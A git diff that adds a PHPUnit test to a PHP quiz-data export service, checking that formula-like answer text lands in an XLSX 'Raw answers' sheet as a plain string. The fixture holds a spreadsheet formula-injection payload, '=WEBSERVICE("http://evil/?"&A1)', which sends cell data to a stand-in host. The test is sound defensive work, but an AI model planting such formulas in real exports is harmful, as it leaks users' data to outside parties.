@@ -5,6 +5,7 @@ declare(strict_types=1);
 namespace Tvdt\Tests\Service;
 
 use PhpOffice\PhpSpreadsheet\Cell\Coordinate;
+use PhpOffice\PhpSpreadsheet\Cell\DataType;
 use PhpOffice\PhpSpreadsheet\Reader;
 use PhpOffice\PhpSpreadsheet\Worksheet\Worksheet;
 use PHPUnit\Framework\Attributes\CoversClass;
@@ -200,6 +201,43 @@ final class DataExportServiceTest extends DatabaseTestCase
         ));
         $this->assertIsArray($claudiaRow);
         $this->assertSame('Man', $claudiaRow[$questionColumnIndex]);
+    }
+
+    public function testRawAnswersSheetStoresFormulaLikeAnswerTextAsPlainString(): void
+    {
+        $season = $this->getSeasonByCode('krtek');
+        $quiz = $this->entityManager->getRepository(Quiz::class)->findOneBy(['name' => 'Quiz 1', 'season' => $season]);
+        $this->assertInstanceOf(Quiz::class, $quiz);
+        $candidate = $this->getCandidateBySeasonAndName($season, 'Claudia');
+
+        /** @var Question $firstQuestion */
+        $firstQuestion = $quiz->questions->first();
+        /** @var Answer $chosenAnswer */
+        $chosenAnswer = $firstQuestion->answers->first();
+        $chosenAnswer->text = '=WEBSERVICE("http://evil/?"&A1)';
+
+        $this->quizCandidateRepository->createIfNotExist($quiz, $candidate);
+        $this->entityManager->persist(new GivenAnswer($candidate, $quiz, $chosenAnswer));
+        $this->entityManager->flush();
+
+        $zip = $this->openZip($this->getUserByEmail('user2@example.org'));
+        $quizContent = $zip->getFromName('krtek-Krtek-Weekend/Quiz-1.xlsx');
+        $this->assertIsString($quizContent);
+        $zip->close();
+
+        $sheet = $this->loadSheet($quizContent, 'Raw answers');
+        $rows = $sheet->toArray();
+        $header = $rows[0];
+        $questionColumnIndex = array_search($firstQuestion->question, $header, true);
+        $this->assertIsInt($questionColumnIndex);
+        $column = Coordinate::stringFromColumnIndex($questionColumnIndex + 1);
+
+        $candidateNames = array_column(\array_slice($rows, 1), 0);
+        $rowNumber = 2 + array_search('Claudia', $candidateNames, true);
+
+        $cell = $sheet->getCell($column.$rowNumber);
+        $this->assertSame(DataType::TYPE_STRING, $cell->getDataType());
+        $this->assertSame('=WEBSERVICE("http://evil/?"&A1)', $cell->getValue());
     }
 
     public function testRawAnswersSheetBoldsCorrectAnswersOnly(): void
